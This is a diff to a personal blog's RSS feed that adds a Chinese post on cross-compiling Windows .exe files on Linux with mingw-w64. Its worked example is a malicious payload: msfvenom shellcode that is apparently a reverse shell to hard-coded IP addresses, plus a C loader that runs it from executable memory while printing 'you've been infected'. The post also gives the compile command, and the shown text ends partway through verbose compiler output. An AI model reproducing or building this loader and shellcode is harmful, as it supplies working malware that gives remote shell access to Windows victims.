@@ -6,9 +6,172 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>2019-2021 | WeepingDogel via CC-BY-NC 4.0</copyright>
-    <lastBuildDate>Fri, 09 Apr 2021 22:50:18 +0800</lastBuildDate>
+    <lastBuildDate>Mon, 26 Apr 2021 14:09:13 +0800</lastBuildDate>
     
         <atom:link href="https://weepingdogel.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>尝试在 Linux下编译 exe 可执行文件</title>
+        <link>https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</link>
+        <pubDate>Mon, 26 Apr 2021 14:09:13 +0800</pubDate>
+        
+        <guid>https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</guid>
+        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/%E5%B0%9D%E8%AF%95%E5%9C%A8linux%E4%B8%8B%E7%BC%96%E8%AF%91exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/ -&lt;h2 id=&#34;序&#34;&gt;序&lt;/h2&gt;
+&lt;p&gt;最近一直在想有没有什么办法可以在 Linux 环境下编译 Windows 中可以运行的 exe 文件，由于自己没有 Windows 环境， 就算开虚拟机也多多少少有些不方便..&lt;/p&gt;
+&lt;p&gt;于是就去谷歌了一下.. 发现办法是有的.&lt;/p&gt;
+&lt;p&gt;这种办法叫做交叉编译, 要用到交叉编译器&lt;/p&gt;
+&lt;p&gt;我们看看维基百科上怎么说&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;交叉编译器（英语：Cross compiler）是指一个在某个系统平台下可以产生另一个系统平台的可执行文件的编译器。交叉编译器在目标系统平台（开发出来的应用程序序所运行的平台）难以或不容易编译时非常有用。&lt;/p&gt;
+&lt;p&gt;交叉编译器的存在对于从一个开发主机为多个平台编译代码是非常有必要的。直接在平台上编译有时行不通，例如在一个嵌入式系统的单片机 ，因为它们没有操作系统，所以直接编译行不通。&lt;/p&gt;
+&lt;p&gt;交叉编译器和源代码至源代码编译器不同，交叉编译器用于二进制代码的跨平台软件开发，而源到源编译器是将某种编程语言的程序源代码作为输入，生成以另一种编程语言构成的等效源代码的编译器，但两者都是编程工具。&lt;/p&gt;
+&lt;p&gt;rel: &lt;a href=&#34;https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8&#34;&gt;https://zh.wikipedia.org/zh-hans/%E4%BA%A4%E5%8F%89%E7%B7%A8%E8%AD%AF%E5%99%A8&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;概念就是这样..&lt;/p&gt;
+&lt;h2 id=&#34;mingw-w64&#34;&gt;mingw-w64&lt;/h2&gt;
+&lt;p&gt;这大概是个交叉编译器了&lt;/p&gt;
+&lt;p&gt;看看官网怎么说&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Mingw-w64 is an advancement of the original mingw.org project, created to support the GCC compiler on Windows systems. It has forked it in 2007 in order to provide support for 64 bits and new APIs. It has since then gained widespread use and distribution.&lt;/p&gt;
+&lt;p&gt;rel: &lt;a href=&#34;https://mingw-w64.org/doku.php&#34;&gt;https://mingw-w64.org/doku.php&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;好的接下来我们就安装它， 这里 Arch 就直接从 pacman 装上了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;$ sudo pacman -S mingw-w64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2021-04-26-14-32-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://weepingdogel.github.io/img/2021-04-26-14-33-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我这里选择 1 2 3 4 5&lt;/p&gt;
+&lt;h2 id=&#34;开始编译&#34;&gt;开始编译&lt;/h2&gt;
+&lt;p&gt;那么， 装完之后就可以开始编译了&lt;/p&gt;
+&lt;p&gt;我打算编译一个 payload 试试看，嘿嘿&lt;/p&gt;
+&lt;p&gt;首先我们先用 &lt;code&gt;msfvenom&lt;/code&gt; 生成一段 &lt;code&gt;shellcode&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;char&lt;/span&gt; buf[] = 
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b\x58\x20\x50\x01\xd3&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xac&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x6d\xa6\x24\x38\x68\x02&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x35\x16\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后编写我们的代码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x70\x68\x02&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+&lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;main&lt;/span&gt;(){
+    printf(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;啊哈！你中毒啦！&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;//ShellExecute(NULL, _T(&amp;#34;open&amp;#34;), _T(&amp;#34;explorer.exe&amp;#34;), _T(&amp;#34;https://www.baiud.com&amp;#34;), NULL, SW_SHOW);
+&lt;/span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;    LPVOID Memory = VirtualAlloc(NULL, &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(Memory, shellcode, &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(shellcode));
+    ((&lt;span style=&#34;color:#cdcaa9;font-weight:bold&#34;&gt;void&lt;/span&gt;(*)())Memory)();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;PS: 这是抄的(bushi)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;接下来进行编译&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;$ i686-w64-mingw32-gcc-10.2.0 payload.c -o payload.exe -v
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;使用内建 specs。
+COLLECT_GCC=i686-w64-mingw32-gcc-10.2.0
+COLLECT_LTO_WRAPPER=/usr/lib/gcc/i686-w64-mingw32/10.2.0/lto-wrapper
+目标：i686-w64-mingw32
+配置为：/build/mingw-w64-gcc/src/gcc/configure --prefix=/usr --libexecdir=/usr/lib --target=i686-w64-mingw32 --with-bugurl=https://bugs.archlinux.org/ --enable-languages=c,lto,c++,ada,objc,obj-c++,fortran --enable-shared --enable-static --enable-threads=posix --enable-fully-dynamic-string --enable-libstdcxx-time=yes --enable-libstdcxx-filesystem-ts=yes --with-system-zlib --enable-cloog-backend=isl --enable-lto --enable-libgomp --disable-multilib --enable-checking=release --disable-sjlj-exceptions --with-dwarf2
+线程模型：posix
+Supported LTO compression algorithms: zlib zstd
+gcc 版本 10.2.0 (GCC) 
+COLLECT_GCC_OPTIONS=&amp;#39;-o&amp;#39; &amp;#39;payload.exe&amp;#39; &amp;#39;-v&amp;#39; &amp;#39;-mtune=generic&amp;#39; &amp;#39;-march=pentiumpro&amp;#39;
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/cc1 -quiet -v -D_REENTRANT payload.c -quiet -dumpbase payload.c -mtune=generic -march=pentiumpro -auxbase payload -version -o /tmp/ccMByM5H.s
+GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
+	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP
+
+警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
+警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
+GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
+忽略不存在的目录“/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/sys-include”
+#include &amp;#34;...&amp;#34; 搜索从这里开始：
+#include &amp;lt;...&amp;gt; 搜索从这里开始：
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/include
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/include-fixed
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/include
+搜索列表结束。
+GNU C17 (GCC) 版本 10.2.0 (i686-w64-mingw32)
+	由 GNU C 版本 10.2.0 编译，GMP 版本 6.2.0，MPFR 版本 4.1.0，MPC 版本 1.1.0，isl 版本 isl-0.21-GMP
+
+警告：GMP 头文件版本 6.2.0 与库版本 6.2.1 不同。
+警告：MPC 头文件版本 1.1.0 与库版本 1.2.1 不同。
+GGC 准则：--param ggc-min-expand=100 --param ggc-min-heapsize=131072
+Compiler executable checksum: ded9fca0c6f5f53dad787dacd8ef9b9f
+COLLECT_GCC_OPTIONS=&amp;#39;-o&amp;#39; &amp;#39;payload.exe&amp;#39; &amp;#39;-v&amp;#39; &amp;#39;-mtune=generic&amp;#39; &amp;#39;-march=pentiumpro&amp;#39;
+ /usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/as -v -o /tmp/ccvhBE4k.o /tmp/ccMByM5H.s
+GNU assembler version 2.35.1 (i686-w64-mingw32) using BFD version (GNU Binutils) 2.35.1
+COMPILER_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/bin/
+LIBRARY_PATH=/usr/lib/gcc/i686-w64-mingw32/10.2.0/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/../lib/:/usr/lib/gcc/i686-w64-mingw32/10.2.0/../../../../i686-w64-mingw32/lib/
+COLLECT_GCC_OPTIONS=&amp;#39;-o&amp;#39; &amp;#39;payload.exe&amp;#39; &amp;#39;-v&amp;#39; &amp;#39;-mtune=generic&amp;#39; &amp;#39;-march=pentiumpro&amp;#39;
